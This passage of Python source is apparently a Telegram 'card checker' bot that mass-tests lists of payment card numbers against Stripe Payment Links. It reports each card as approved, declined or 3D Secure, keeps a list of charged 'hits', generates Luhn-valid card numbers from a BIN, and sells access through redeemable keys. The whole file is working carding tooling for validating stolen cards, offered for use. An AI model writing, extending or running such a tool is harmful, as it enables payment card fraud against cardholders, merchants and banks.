                result_output = f"""{status_icon} Gateway: Stripe Payment Link [ /chk ]
-------------------------------
{status_icon} Card: <code>{card_str}</code>
{status_icon} Status: {status_text}
{status_icon} Response: {response_text} [{bin_scheme}] [{card['number'][-4:]}]
-------------------------------
{status_icon} Bin: {bin_scheme} - {bin_type} - {bin_brand}
{status_icon} Bank: {bin_bank} - {bin_emoji}
{status_icon} Country: {bin_country} [ {bin_emoji} ]
-------------------------------
{status_icon} Time: {datetime.now().strftime('%H:%M:%S')}
{status_icon} Price: Free
{status_icon} By: Mo.dark Checker
-------------------------------
{status_icon} Dev: @yacine_X6"""
                await update.message.reply_text(result_output, parse_mode="HTML")

            else:
                declined_count += 1; udata["declined"] += 1
                status_icon = "[-]"
                status_text = "DECLINED"
                response_text = msg

                result_output = f"""{status_icon} Gateway: Stripe Payment Link [ /chk ]
-------------------------------
{status_icon} Card: <code>{card_str}</code>
{status_icon} Status: {status_text}
{status_icon} Response: {response_text} [{bin_scheme}] [{card['number'][-4:]}]
-------------------------------
{status_icon} Bin: {bin_scheme} - {bin_type} - {bin_brand}
{status_icon} Bank: {bin_bank} - {bin_emoji}
{status_icon} Country: {bin_country} [ {bin_emoji} ]
-------------------------------
{status_icon} Time: {datetime.now().strftime('%H:%M:%S')}
{status_icon} Price: Free
{status_icon} By: Mo.dark Checker
-------------------------------
{status_icon} Dev: @yacine_X6"""
                await update.message.reply_text(result_output, parse_mode="HTML")

            results.append(f"{card_str} -> {status_text}")

            # Update progress
            if idx % 5 == 0 or idx == len(valid_cards):
                progress = (idx / len(valid_cards)) * 100
                try:
                    await status_msg.edit_text(
                        f"{fb('Checking...')} {progress:.0f}%\n"
                        f"{idx}/{len(valid_cards)}\n"
                        f"{fb('Approved')}: {charged_count} | {fb('Declined')}: {declined_count} | {fb('3DS')}: {_3ds_count}",
                        parse_mode="HTML"
                    )
                except: pass
                await asyncio.sleep(0.3)
        except Exception as e:
            results.append(f"[-] {card['number']}|... -> ERROR")

    # Final summary with colored buttons
    result_text = "\n".join(results)
    result_file = BytesIO(result_text.encode("utf-8"))
    result_file.name = f"results_{datetime.now().strftime('%H%M%S')}.txt"

    summary = f"""{fb('Mass Check Complete')}
━━━━━━━━━━━━━━
{fb('Total')}: <b>{len(valid_cards)}</b>
{fb('Approved')}: <b>{charged_count}</b>
{fb('Declined')}: <b>{declined_count}</b>
{fb('3DS')}: <b>{_3ds_count}</b>

{fb('Success Rate')}: <b>{(charged_count/len(valid_cards)*100):.1f}%</b>"""

    await update.message.reply_document(
        document=InputFile(result_file),
        caption=summary,
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton(fb(f"Approved {charged_count}"), callback_data="done_approved")],
            [InlineKeyboardButton(fb(f"3D Secure {_3ds_count}"), callback_data="done_3ds")],
            [InlineKeyboardButton(fb(f"Declined {declined_count}"), callback_data="done_declined")],
            [InlineKeyboardButton(fb("Back"), callback_data="menu")],
        ]),
        parse_mode="HTML"
    )


async def cmd_bin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text(f"{fb('Usage')}: <code>/bin 424242</code>", parse_mode="HTML")
        return
    bin_num = context.args[0].strip()
    if not bin_num.isdigit() or len(bin_num) < 6:
        await update.message.reply_text(f"{fb('Invalid BIN! Use 6+ digits.')}", parse_mode="HTML")
        return
    status_msg = await update.message.reply_text(f"{fb('Looking up BIN')} {bin_num}...", parse_mode="HTML")
    info = bin_lookup(bin_num)
    if info:
        text = f"""{fb('BIN Lookup')}: <code>{bin_num[:6]}</code>
━━━━━━━━━━━━━━
{fb('Scheme')}: <b>{info['scheme']}</b>
{fb('Type')}: <b>{info['type']}</b>
{fb('Brand')}: <b>{info['brand']}</b>
{fb('Country')}: <b>{info['country']}</b> {info['emoji']}
{fb('Bank')}: <b>{info['bank']}</b>
━━━━━━━━━━━━━━"""
    else:
        text = f"{fb('Could not fetch BIN info. Try again later.')}"""
    await status_msg.edit_text(text, parse_mode="HTML")


async def cmd_gen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 1:
        await update.message.reply_text(f"{fb('Usage')}: <code>/gen 424242 [count]</code>\n{fb('Max 10 cards.')}", parse_mode="HTML")
        return
    bin_prefix = context.args[0].strip()
    count = int(context.args[1]) if len(context.args) > 1 and context.args[1].isdigit() else 10
    count = min(count, 10)
    cards = gen_card_from_bin(bin_prefix, count)
    if not cards:
        await update.message.reply_text(f"{fb('Could not generate cards. Check BIN.')}", parse_mode="HTML")
        return
    cards_text = "\n".join([f"├─ <code>{c}</code>" for c in cards])
    text = f"""{fb('Card Generator')}
━━━━━━━━━━━━━━
{fb('BIN')}: <code>{bin_prefix}</code>
{fb('Generated')}: <b>{len(cards)}</b>

{cards_text}
└─
━━━━━━━━━━━━━━
{fb('All cards pass Luhn check.')}"""
    keyboard = [
        [InlineKeyboardButton(fb("Regenerate"), callback_data=f"regen_{bin_prefix}_{count}")],
        [InlineKeyboardButton(fb("Back"), callback_data="tools")],
    ]
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="HTML")


async def cmd_add(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if str(user_id) != str(ADMIN_ID):
        await update.message.reply_text(f"{fb('Admin only!')}", parse_mode="HTML")
        return
    if len(context.args) < 2:
        await update.message.reply_text(f"{fb('Usage')}: <code>/add name https://buy.stripe.com/xxxxx</code>", parse_mode="HTML")
        return
    name, url = context.args[0], context.args[1]
    add_gateway(name, url)
    await update.message.reply_text(f"{fb('Gateway added')}: <b>{name}</b>\n<code>{url}</code>", parse_mode="HTML")


async def cmd_rm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if str(user_id) != str(ADMIN_ID):
        await update.message.reply_text(f"{fb('Admin only!')}", parse_mode="HTML")
        return
    if not context.args:
        await update.message.reply_text(f"{fb('Usage')}: <code>/rm gateway_name</code>", parse_mode="HTML")
        return
    name = context.args[0]
    if remove_gateway(name):
        await update.message.reply_text(f"{fb('Gateway removed')}: <b>{name}</b>", parse_mode="HTML")
    else:
        await update.message.reply_text(f"{fb('Cannot remove default or not found.')}", parse_mode="HTML")


async def cmd_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    gw_list = "\n".join([f"├─ <b>{v['name']}</b> ➜ {v['url']}" for v in gateways.values()])
    text = f"""{fb('Gateway Info')}
━━━━━━━━━━━━━━
{gw_list}
└─
━━━━━━━━━━━━━━"""
    await update.message.reply_text(text, parse_mode="HTML")


async def cmd_redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text(f"{fb('Usage')}: <code>/redeem KEY-XXXX-XXXX</code>", parse_mode="HTML")
        return
    key = context.args[0]
    user_id = update.effective_user.id
    result = redeem_key(key, user_id)
    if result:
        await update.message.reply_text(f"{fb('Key redeemed!')}\n{fb('Plan')}: <b>{result['plan']}</b>\n{fb('Days')}: <b>{result['days']}</b>", parse_mode="HTML")
    else:
        await update.message.reply_text(f"{fb('Invalid or used key!')}", parse_mode="HTML")


async def cmd_stopcheck(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stop_all_checks()
    await update.message.reply_text(f"{fb('Stop signal sent. Checks will halt.')}", parse_mode="HTML")


async def cmd_sendhit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    udata = get_user(user_id)
    hits = [h for h in udata["history"] if h["success"]]
    if not hits:
        await update.message.reply_text(f"{fb('No charged cards in history.')}", parse_mode="HTML")
        return
    hit_text = "\n".join([f"├─ <code>{h['card']}</code> ➜ {h['time']}" for h in hits[-10:]])
    text = f"""{fb('Hit List')}
━━━━━━━━━━━━━━
{hit_text}
└─
━━━━━━━━━━━━━━"""
    await update.message.reply_text(text, parse_mode="HTML")


async def cmd_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if str(user_id) != str(ADMIN_ID):
        await update.message.reply_text(f"{fb('Admin only!')}", parse_mode="HTML")
        return
    total_users = len(user_db)
    total_checks = sum(u["checks"] for u in user_db.values())
    total_charged = sum(u["charged"] for u in user_db.values())
    text = f"""{fb('Admin Panel')}
━━━━━━━━━━━━━━
{fb('Total Users')}: <b>{total_users}</b>
{fb('Total Checks')}: <b>{total_checks}</b>
{fb('Total Charged')}: <b>{total_charged}</b>
{fb('Time')}: <code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>
━━━━━━━━━━━━━━"""
    await update.message.reply_text(text, parse_mode="HTML")


async def cmd_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if str(user_id) != str(ADMIN_ID): return
    if not context.args:
        await update.message.reply_text(f"{fb('Usage')}: /broadcast message")
        return
    message = " ".join(context.args)
    sent = failed = 0
    for uid in user_db:
        try:
            await context.bot.send_message(uid, f"{fb('Admin Notice')}:\n\n{message}", parse_mode="HTML")
            sent += 1
        except: failed += 1
    await update.message.reply_text(f"{fb('Sent')}: {sent}\n{fb('Failed')}: {failed}", parse_mode="HTML")


# ════════════════════════════════════════════════════════════
# HANDLERS
# ════════════════════════════════════════════════════════════

async def document_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = context.user_data.get("state", "")
    user_id = update.effective_user.id
    udata = get_user(user_id)
    document = update.message.document
    if not document.file_name.endswith(".txt"):
        await update.message.reply_text(f"{fb('Please send .txt files only!')}", parse_mode="HTML")
        return
    file = await context.bot.get_file(document.file_id)
    file_bytes = await file.download_as_bytearray()
    content = file_bytes.decode("utf-8", errors="ignore")
    lines = [line.strip() for line in content.split("\n") if line.strip()]
    is_admin = str(user_id) == str(ADMIN_ID)
    if not is_admin and len(lines) > 50:
        await update.message.reply_text(f"{fb('Limited to 50 cards. File truncated.')}", parse_mode="HTML")
        lines = lines[:50]
    await process_mass(update, context, lines, user_id, udata)
    context.user_data["state"] = ""


async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = context.user_data.get("state", "")
    text = update.message.text or ""
    user_id = update.effective_user.id
    udata = get_user(user_id)
    if state == "chk":
        context.args = text.split()
        await cmd_chk(update, context)
        context.user_data["state"] = ""
    elif "|" in text and len(text.split("|")) >= 4:
        context.args = text.split()
        await cmd_chk(update, context)
    else:
        await update.message.reply_text(f"{fb('Mo.dark Card Checker')}\n\n{fb('Use the menu or commands:')}", reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton(fb("Tools"), callback_data="tools")],
            [InlineKeyboardButton(fb("Profile"), callback_data="profile")],
            [InlineKeyboardButton(fb("Settings"), callback_data="settings")],
            [InlineKeyboardButton(fb("About"), callback_data="about")],
        ]), parse_mode="HTML")


# ════════════════════════════════════════════════════════════
# MAIN
# ════════════════════════════════════════════════════════════

def main():
    print(f"""
Mo.dark Card Checker Bot v7.0
Engine: Stripe Payment Link
Font: Feedback
Language: English
Colored Buttons: Active (via requests API)
    """)
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("[ERROR] Set BOT_TOKEN")
        return
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("chk", cmd_chk))
    application.add_handler(CommandHandler("mass", cmd_mass))
    application.add_handler(CommandHandler("bin", cmd_bin))
    application.add_handler(CommandHandler("gen", cmd_gen))
    application.add_handler(CommandHandler("add", cmd_add))
    application.add_handler(CommandHandler("rm", cmd_rm))
    application.add_handler(CommandHandler("info", cmd_info))
    application.add_handler(CommandHandler("redeem", cmd_redeem))
    application.add_handler(CommandHandler("stopcheck", cmd_stopcheck))
    application.add_handler(CommandHandler("sendhit", cmd_sendhit))
    application.add_handler(CommandHandler("admin", cmd_admin))
    application.add_handler(CommandHandler("broadcast", cmd_broadcast))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
    application.add_handler(MessageHandler(filters.Document.ALL, document_handler))
    print("[+] Bot started successfully!")
    print("[*] Waiting for connections...")

    try:
        application.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
    except KeyboardInterrupt:
        print("\n[!] Bot stopped by user (Ctrl+C)")
    except Exception as e:
        print(f"[!] Bot error: {e}")
        import time
        print("[*] Restarting in 5 seconds...")
        time.sleep(5)
        main()


if __name__ == "__main__":
    while True:
        try:
            main()
        except KeyboardInterrupt:
            print("\n[!] Exiting...")
            break
        except Exception as e:
            print(f"[!] Fatal error: {e}")
            print("[*] Restarting in 10 seconds...")
            import time
            time.sleep(10)
